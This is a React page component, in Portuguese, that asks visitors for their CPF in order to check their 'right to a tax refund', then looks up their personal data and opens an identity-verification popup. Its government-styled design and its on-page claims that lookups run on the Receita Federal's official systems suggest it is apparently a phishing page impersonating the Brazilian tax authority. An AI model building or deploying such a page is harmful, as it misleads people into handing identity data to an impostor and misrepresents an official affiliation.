import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { apiRequest } from "@/lib/queryClient";
import VerificacaoIdentidade from "../components/VerificacaoIdentidade";

// Validação de CPF
const cpfSchema = z.object({
  cpf: z.string()
    .min(11, {
      message: "CPF deve ter 11 dígitos",
    })
    .max(14)
    .transform(val => val.replace(/\D/g, "")) // Remove caracteres não numéricos
    .refine(val => val.length === 11, {
      message: "CPF deve ter 11 dígitos",
    })
});

type CpfFormType = z.infer<typeof cpfSchema>;

export default function VerificarRestituicao() {
  const [, navigate] = useLocation();
  const [cpfConsultado, setCpfConsultado] = useState("");
  const [showVerificacao, setShowVerificacao] = useState(false);
  
  // Formulário de CPF
  const form = useForm<CpfFormType>({
    resolver: zodResolver(cpfSchema),
    defaultValues: {
      cpf: "",
    },
  });

  // Query para consultar os dados do CPF
  const { data: dadosPessoais, isLoading, isError, error } = useQuery({
    queryKey: ["cpf", cpfConsultado],
    queryFn: async () => {
      if (!cpfConsultado) return null;
      
      try {
        const response = await apiRequest(
          "GET", 
          `/api/consulta-cpf?cpf=${cpfConsultado}`
        );
        
        if (!response.ok) {
          throw new Error("Erro ao consultar CPF");
        }
        
        return await response.json();
      } catch (error) {
        console.error("Erro ao consultar CPF:", error);
        throw error;
      }
    },
    enabled: !!cpfConsultado,
    refetchOnWindowFocus: false,
  });

  const formatCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  const onSubmit = (data: CpfFormType) => {
    const cpfLimpo = data.cpf.replace(/\D/g, "");
    setCpfConsultado(cpfLimpo);
    setShowVerificacao(true);
  };

  const handleVerificacaoConcluida = (dadosConfirmados: any) => {
    // Navegar para a página de resultados com os dados confirmados
    navigate(`/resultado?cpf=${cpfConsultado}&nome=${encodeURIComponent(dadosConfirmados.nome)}`);
  };

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-1 bg-[var(--gov-gray-light)] py-12">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto">
            <Card className="shadow-md">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                <CardTitle className="text-2xl font-bold">Verificar Direito à Restituição</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Informe seu CPF para consultar seus valores
                </CardDescription>
              </CardHeader>
              <CardContent className="p-8">
                <Form {...form}>
                  <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                      control={form.control}
                      name="cpf"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">CPF</FormLabel>
                          <FormControl>
                            <Input
                              placeholder="000.000.000-00"
                              {...field}
                              className="border-[var(--gov-gray)] focus:border-[var(--gov-blue)]"
                              onChange={(e) => {
                                // Formata o CPF enquanto o usuário digita
                                let value = e.target.value.replace(/\D/g, "");
                                if (value.length <= 11) {
                                  if (value.length > 9) {
                                    value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
                                  } else if (value.length > 6) {
                                    value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
                                  } else if (value.length > 3) {
                                    value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
                                  }
                                  field.onChange(value);
                                }
                              }}
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <div className="text-center">
                      <Button 
                        type="submit" 
                        className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold px-8 py-6 text-lg"
                        disabled={isLoading}
                      >
                        {isLoading ? "Consultando..." : "Consultar CPF"}
                      </Button>
                    </div>
                    
                    {isError && (
                      <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
                        Não foi possível verificar o CPF. Por favor, tente novamente.
                      </div>
                    )}
                  </form>
                </Form>
                
                {/* Requisitos de segurança */}
                <div className="mt-8 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
                  <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informações de Segurança:</h3>
                  <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
                    <li>• Seus dados são protegidos e criptografados.</li>
                    <li>• A consulta é feita nos sistemas oficiais da Receita Federal.</li>
                    <li>• É necessário confirmar sua identidade para prosseguir.</li>
                    <li>• Não compartilhamos seus dados com terceiros.</li>
                  </ul>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      {/* Popup de verificação de identidade */}
      {showVerificacao && dadosPessoais && (
        <VerificacaoIdentidade 
          dadosPessoais={dadosPessoais} 
          onClose={() => setShowVerificacao(false)} 
          onSuccess={handleVerificacaoConcluida}
        />
      )}
      
      <Footer />
    </div>
  );
}